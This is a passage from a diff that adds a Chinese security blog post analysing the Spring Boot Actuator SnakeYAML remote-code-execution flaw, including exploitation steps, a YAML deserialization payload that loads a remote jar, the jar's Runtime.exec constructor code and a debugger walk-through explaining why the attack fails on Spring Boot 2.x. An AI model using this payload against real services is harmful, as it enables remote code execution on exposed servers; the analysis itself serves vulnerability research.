class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>若未配置management.endpoint.env.post.enabled=true，则不支持post请求：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820001100409.png" alt="image-20210820001100409"></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820001105281.png" alt="image-20210820001105281"></p>
+<p>当配置management.endpoint.env.post.enabled=true后，可支持post请求：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820001124290.png" alt="image-20210820001124290"></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820001135258.png" alt="image-20210820001135258"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="部分条件"><a href="#部分条件" class="headerlink" title="部分条件"></a>部分条件</h2><p>SpringBoot 1.x（spring-cloud-context copyEnvironment函数未更新前）</p>
+<p>Actuator未授权且需springcloud扩展env endpoints post请求</p>
+<p>org.yaml.snakeyaml组件</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p><a target="_blank" rel="noopener" href="https://github.com/ttestoo/springboot-actuator-snakeyaml-rce">https://github.com/ttestoo/springboot-actuator-snakeyaml-rce</a></p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>1、vps起个http服务，上面放yml配置文件yaml-payload.yml和yaml-payload.jar文件：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820002721240.png" alt="image-20210820002721240"></p>
+<p>yaml-payload.yml内容如下：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1:8087/yaml-payload.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>yaml-payload.jar参考：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload%EF%BC%8C%E4%B8%BB%E8%A6%81%E5%86%85%E5%AE%B9%E5%9C%A8%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%AD%EF%BC%9A">https://github.com/artsploit/yaml-payload，主要内容在构造方法中：</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AwesomeScriptEngineFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、利用actuator的/env endpoint修改spring.cloud.bootstrap.location属性的值为vps上的yml配置文件的地址<a target="_blank" rel="noopener" href="http://127.0.0.1:8087/yaml-payload.yaml%EF%BC%9A">http://127.0.0.1:8087/yaml-payload.yaml：</a></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820002846139.png" alt="image-20210820002846139"></p>
+<p>通过actuator的/refresh接口刷新配置，则成功执行payload：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820002906060.png" alt="image-20210820002906060"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>springboot actuator组件未授权访问时，其/env端点经过spring cloud的扩展，可通过post请求设置env属性值，/refresh端点可以刷新配置；</p>
+<p>当设置spring.cloud.bootstrap.location的值为外部的yaml文件地址时，通过refresh端点刷新时将会访问yaml文件地址并读取yaml文件内容：</p>
+<ul>
+<li>http请求/refresh接口，将进入到刷新配置的入口 org.springframework.cloud.endpoint.RefreshEndpoint#refresh：</li>
+</ul>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003032508.png" alt="image-20210820003032508">    </p>
+<ul>
+<li>其中spring.cloud.bootstrap.location的值 将在org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中进行处理：</li>
+</ul>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003101650.png" alt="image-20210820003101650">    </p>
+<ul>
+<li>由于获取到spring.cloud.bootstrap.location的值为yaml后缀，将在org.springframework.boot.env.PropertySourcesLoader#load中调用到org.springframework.boot.env.YamlPropertySourceLoader#load进行加载yaml文件：</li>
+</ul>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003122041.png" alt="image-20210820003122041">    </p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003133897.png" alt="image-20210820003133897">    </p>
+<ul>
+<li>最终在org.yaml.snakeyaml.Yaml#loadAll中进行读取yaml文件内容：</li>
+</ul>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003144955.png" alt="image-20210820003144955">    </p>
+<p>通过org.yaml.snakeyaml.Yaml#loadAll读取yaml文件内容，简单总结如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">Object url = yaml.load(<span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8087/yaml-payload.jar\&quot;]\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;]&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>由于SnakeYAML支持!!+完整类名的方式指定要反序列化的类，并可以[arg1, arg2, ……] 的方式传递构造方法所需参数，则上述操作等价于执行如下内容：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://127.0.0.1:8087/yaml-payload.jar&quot;</span>);</span><br><span class="line">URLClassLoader urlClassLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line"><span class="keyword">new</span> ScriptEngineManager(urlClassLoader);</span><br></pre></td></tr></table></figure>
+
+<p>而URLClassLoader继承自SecureClassLoader（继承自ClassLoader），支持从jar包、文件系统目录和远程http服务器中动态获取class文件以加载类（ClassLoader只能加载classpath下面的类）；</p>
+<p>这里则将访问<a target="_blank" rel="noopener" href="http://127.0.0.1:8087/yaml-payload.jar%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87javax.script.ScriptEngineManager#ScriptEngineManager%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%EF%BC%9A">http://127.0.0.1:8087/yaml-payload.jar，并通过javax.script.ScriptEngineManager#ScriptEngineManager进行处理：</a></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003248131.png" alt="image-20210820003248131"></p>
+<p>下面就是ScriptEngineManager利用链的分析过程；</p>
+<p>首先init()中调用initEngines()，使用SPI机制动态加载javax.script.ScriptEngineFactory的实现类，即通过getServiceLoader，去寻找yaml-payload.jar中META-INF/services目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载其中指定的类；</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003326541.png" alt="image-20210820003326541">    </p>
+<p>为了满足Java SPI机制（是JDK内置的一种服务提供发现机制）的约定，在yaml-payload.jar中的恶意类实现了ScriptEngineFactory，META-INF/services/目录下存在一个名为javax.script.ScriptEngineFactory，文件内容为完整恶意类名：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003339881.png" alt="image-20210820003339881">    </p>
+<p>Java SPI机制可参考：<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/sound/SPI-intro.html">https://docs.oracle.com/javase/tutorial/sound/SPI-intro.html</a></p>
+<p>继续跟进，经过如下调用链：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003358201.png" alt="image-20210820003358201">    </p>
+<p>最终在java.util.ServiceLoader.LazyIterator#nextService中利用Java反射机制获取yaml-payload.jar中的恶意类，并在newInstance时触发恶意类构造函数中的payload：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003411252.png" alt="image-20210820003411252">    </p>
+<p> <img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003430551.png" alt="image-20210820003430551"></p>
+<p>注意，这里forName的第二个参数initialize为false，有些博客描述为当true时则可触发恶意类构造函数中的payload；</p>
+<p>其实，当forName第二个参数为true时仅会进行类初始化，从注释中也可看到：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003445952.png" alt="image-20210820003445952">    </p>
+<p>而类的初始化并不会执行构造函数，但是会执行静态代码块，验证如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassForname</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        ClassLoader loader = TestClassForname.class.getClassLoader();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n=========initialize为false测试==========&quot;</span>);</span><br><span class="line">        Class.forName(<span class="string">&quot;com.ttestoo.snakeyaml.payload.Test&quot;</span>, <span class="keyword">false</span>, loader);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n=========initialize为true测试==========&quot;</span>);</span><br><span class="line">        Class.forName(<span class="string">&quot;com.ttestoo.snakeyaml.payload.Test&quot;</span>, <span class="keyword">true</span>, loader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;静态代码块被调用。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;无参构造函数被调用。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003514115.png" alt="image-20210820003514115"></p>
+<p>当然，恶意类中的payload也可以放在静态代码块中，由于这里为false依旧在newInstance()时触发：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title">ScriptEngineFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
+
+<h1 id="SpringBoot-2-x利用的问题"><a href="#SpringBoot-2-x利用的问题" class="headerlink" title="SpringBoot 2.x利用的问题"></a>SpringBoot 2.x利用的问题</h1><p>上述分析过程在springboot 1.x环境下，8月16号刚好遇到实际业务环境springboot 2.x存在actuator未授权访问问题，且存在snakeyaml组件：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003637126.png" alt="image-20210820003637126">    </p>
+<p>利用过程中env endpoints post请求正常：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003647929.png" alt="image-20210820003647929">    </p>
+<p>但是请求refresh后并无任何动静，且响应内容为空（1.x请求refresh端点会响应“document”）：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003700057.png" alt="image-20210820003700057">    </p>
+<p>这就是知识点未学透的结果！！！对于此利用方式，2.x能否成功rce呢？</p>
+<p>搭建2.x的测试环境（和业务环境一致），如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">springboot <span class="number">2.0</span><span class="number">.6</span>.RELEASE</span><br><span class="line">springcloud <span class="number">2.0</span><span class="number">.0</span>.RELEASE</span><br><span class="line">org.yaml.snakeyaml <span class="number">1.19</span></span><br><span class="line"></span><br><span class="line">注意<span class="number">2.</span>x需手工配置开启env、refresh endpoints，这里为方便直接*：</span><br><span class="line">management.endpoints.web.exposure.include=*</span><br></pre></td></tr></table></figure>
+
+<p>在1.x利用分析过程中得知spring.cloud.bootstrap.location属性是在org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中获取，这里直接在此处下断点：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003744991.png" alt="image-20210820003744991">    </p>
+<p>开启debug，记得在请求refresh前通过env设置spring.cloud.bootstrap.location属性（否则可能为空，影响判断）：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003758057.png" alt="image-20210820003758057">    </p>
+<p>接下来请求refresh端点，可清晰看到此时configLocation为空，即并未获取到上步设置的spring.cloud.bootstrap.location属性：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003808859.png" alt="image-20210820003808859">    </p>
+<p>此时environment参数中无任何spring.cloud.bootstrap.location属性相关的信息：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003820284.png" alt="image-20210820003820284">    </p>
+<p>回看1.x环境中的environment，发现在propertySources的propertySourceList中包含一个name为manager，value为env post请求设置的属性值：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003832112.png" alt="image-20210820003832112">    </p>
+<p>可初步判断是在设置spring.cloud.bootstrap.location属性时出现了变更导致environment变量中无spring.cloud.bootstrap.location属性造成无法rce；</p>
+<p>那么接下来就可以溯源environment变量如何生成的；根据执行到String configLocation = environment.resolvePlaceholders(“${spring.cloud.bootstrap.location:}”);的调用链，可得知environment在org.springframework.cloud.context.refresh.ContextRefresher#refresh中定义并通过org.springframework.cloud.context.refresh.ContextRefresher#copyEnvironment函数进行赋值：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003844193.png" alt="image-20210820003844193">    </p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003856384.png" alt="image-20210820003856384">    </p>
+<p>对比spring-cloud-context 1.2.0和spring-cloud-context 2.0.0的copyEnvironment函数，其中1.x中将input（来自this.context.getEnvironment()，包含post env设置的spring.cloud.bootstrap.location属性）中propertySources的propertySourceList全部赋值给environment：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003908366.png" alt="image-20210820003908366">    </p>
+<p>而在2.x中增加了一个for循环进行判断name是否在常量DEFAULT_PROPERTY_SOURCES中，只有在其中的才会执行capturedPropertySources.addLast操作：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003920092.png" alt="image-20210820003920092">    </p>
+<p>跟进常量DEFAULT_PROPERTY_SOURCES，为String数组：[“commandLineArgs”, “defaultProperties”]</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003947014.png" alt="image-20210820003947014"></p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820003942919.png" alt="image-20210820003942919">    </p>
+<p>由于我们通过post env端点设置的spring.cloud.bootstrap.location属性值存放在name为manager中，所以这里并不会执行capturedPropertySources.addLast操作，也就无法添加到environment中，从而导致spring.cloud.bootstrap.location属性值在refresh时并未设置并刷新：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820004046273.png" alt="image-20210820004046273">    </p>
+<p>即上面所说的现象，org.springframework.cloud.bootstrap.BootstrapApplicationListener#bootstrapServiceContext中获取spring.cloud.bootstrap.location属性值时为空：</p>
+<p><img src="/2021/08/19/SpringBoot-Actuator-SnakeYAML-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210820004107671.png" alt="image-20210820004107671">    </p>
+<blockquote>
+<p>注意，这里补充下，根据“Actuator env说明”部分可知，refresh是在spring-cloud-context中扩展的，所以此问题重点是spring-cloud-context的变更导致，即上方org.springframework.cloud.context.refresh.ContextRefresher#copyEnvironment函数的不同。</p>
+</blockquote>
+<h1 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a>巨人的肩膀</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">exploiting-spring-boot-actuators</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">yaml-payload</a></li>
+<li><a target="_blank" rel="noopener" href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note">exploit-spring-boot-actuator-spring-cloud-env-note</a></li>
+<li>……</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
 
@@ -427,20 +1603,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -499,13 +1675,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">7k</span>
+    <span title="站点总字数">51k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">6 分钟</span>
+    <span title="站点阅读时长">46 分钟</span>
 </div>
 
         
